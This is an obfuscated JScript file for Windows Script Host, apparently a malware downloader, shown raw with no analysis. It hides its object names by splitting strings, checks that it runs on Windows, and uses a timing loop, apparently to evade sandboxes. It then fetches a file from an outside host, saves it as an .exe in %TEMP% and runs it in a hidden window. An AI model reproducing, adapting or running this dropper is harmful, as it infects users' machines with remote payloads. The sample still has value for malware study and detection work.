var Y1 = false;
var XI = "Create"+"Object";
var BT = function Y() {return WScript[XI]("WScript"+".Shell");}(), F1 = 11;
var OG = "MSXML2"+".XMLHTTP";
var CB = 2;
var B = CB - 2;
function F(Y0){BT["Run"](Y0, B, B);};
function YA(){return OG + "";};
function H(XP, OU){B = B * 1; return XP - OU;};
function F0(){return XI;};
/*@cc_on
  @if (@_win32 || @_win64)
    Y1 = true;
  @end
@*/
if (Y1)
{
var KO = "";
function JI(){return 22;};
var X0 = 0; var UY = 0;
function QE()
{
var J = new this["Date"]();
var G0 = J["getUTCMilliseconds"]();
WScript["Sleep"](JI());
var J = new this["Date"]();
var OO = J["getUTCMilliseconds"]();
WScript["Sleep"](JI());
var J = new this["Date"]();
var CS = J["getUTCMilliseconds"]();
var X0 = "YF";
X0 = H(OO, G0);
var UY = "CR";
UY = H(CS, OO);
KO = "open";
return H(X0, UY);
}
var T = false;
var UQ = false;
for (var Z = B; Z < JI() * 1; Z++){if (QE() != B){
T = true; 
UY = "31" + 11 * X0 + UY; 
UQ = true; 
break;
}}
function A() {return ((T == true) && (T == UQ)) ? 1 : B;};
if (T && A() && UQ){
function G() {return BT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "voPvicwNz9.ex" + "e";};
 P = YA();
 G1 = WScript[XI](P);
 var NX = 1;
do { 
	for (;NX;){
	try {
		if (NX == 1)
		{
			G1[KO]("GET", "http://beimeihuifu.com/n7dja", false);
			G1["send"]();
			OP = "Sleep";
			NX = 2;
		}
		WScript[OP](JI() + 120); 
		if (G1["readystate"] < 2 * 2) continue;
		NX = B;
		function X(IS) {var A0 = (1, 2, 3, 4, 5, IS); return A0;};
		O0 = WScript[F0()]("ADODB.Stream");
		P = O0;
		P[KO]();
		P["type"] = X(1);
		P["write"](G1["ResponseBody"]);
		O0["position"] = X(B);
		P["Save" + "ToFile"](G(), 2);
		O0["cl"+"ose"]();
		O = G();
		F(O);
	} catch(LP){};};
}while (NX);
}
}

